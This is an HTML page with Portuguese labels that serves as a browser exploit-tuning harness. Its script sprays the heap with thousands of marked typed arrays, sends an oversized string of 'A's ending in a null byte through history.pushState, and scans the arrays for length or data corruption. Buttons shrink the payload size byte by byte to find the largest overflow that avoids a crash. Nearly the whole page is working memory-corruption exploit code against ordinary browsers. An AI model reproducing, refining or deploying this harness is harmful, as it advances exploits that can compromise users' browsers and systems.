<!DOCTYPE html>
<html>
<head>
    <title>Base Reducer: The Safe Fit</title>
    <style>
        body { background: #000; color: #ffaa00; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #630; height: 350px; overflow-y: scroll; padding: 10px; background: #210; color: #fc0; margin-bottom: 15px;}
        .controls { display: flex; gap: 10px; justify-content: center; background: #111; padding: 15px; border: 1px solid #444; }
        button { 
            padding: 15px; font-weight: bold; cursor: pointer; 
            background: #420; color: #fff; border: 1px solid #840; 
            font-size: 18px; min-width: 120px;
        }
        button:hover { background: #840; }
        .monitor { font-size: 30px; color: #fff; text-align: center; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>BASE REDUCER</h1>
    <p>Objetivo: Achar o tamanho máximo que aceita 0x00 sem crashar.</p>
    
    <div class="monitor">Base Atual: <span id="baseVal">709522</span></div>

    <div class="controls">
        <button onclick="adjust(-1)">-1 Byte</button>
        <button onclick="adjust(-2)">-2 Bytes</button>
        <button onclick="adjust(-4)">-4 Bytes</button>
        <button onclick="adjust(-8)">-8 Bytes</button>
    </div>

    <button onclick="runTest()" style="width:100%; margin-top:10px; background: #004400; border-color:#0f0;">TESTAR AGORA (Byte 0x00)</button>

    <div id="logger" class="log">Comece diminuindo a base...</div>

    <script>
        const logger = document.getElementById('logger');
        var currentBase = 709522; 
        const MAGIC_NUM = 0x41414141;
        const SPRAY_SIZE = 10000; // Spray denso (No Hole logic)

        var spray = [];

        function log(msg) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        function adjust(amount) {
            currentBase += amount;
            document.getElementById('baseVal').innerText = currentBase;
            log(`Base ajustada para: ${currentBase}`);
        }

        async function runTest() {
            log("---------------------------------------");
            log(`TESTANDO BASE: ${currentBase} + 1 Byte (0x00)`);

            // 1. Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 300));
            spray = [];

            // 2. Spray Contíguo
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                spray.push(arr);
            }

            log("Estabilizando Heap...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // 3. Payload
                // Base ajustável + 1 byte seguro (0x00)
                let base = new Array(currentBase + 1).join('A');
                let overflow = "\x00"; 
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + currentBase + "_" + Date.now(), payload);
                
                checkCorruption();

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption() {
            log("Verificando...");
            let found = false;
            for(let i = spray.length - 1; i >= 0; i--) {
                let arr = spray[i];
                if(arr) {
                    if(arr.length !== 1024) {
                        found = true;
                        alert(`SUCESSO! Base ${currentBase} funcionou! Length: ${arr.length}`);
                        return;
                    }
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`DADO ALTERADO no Index ${i}`, 'highlight');
                    }
                }
            }
            if(!found) log(`Base ${currentBase}: Estável (Sem Crash).`);
        }
    </script>
</body>
</html>
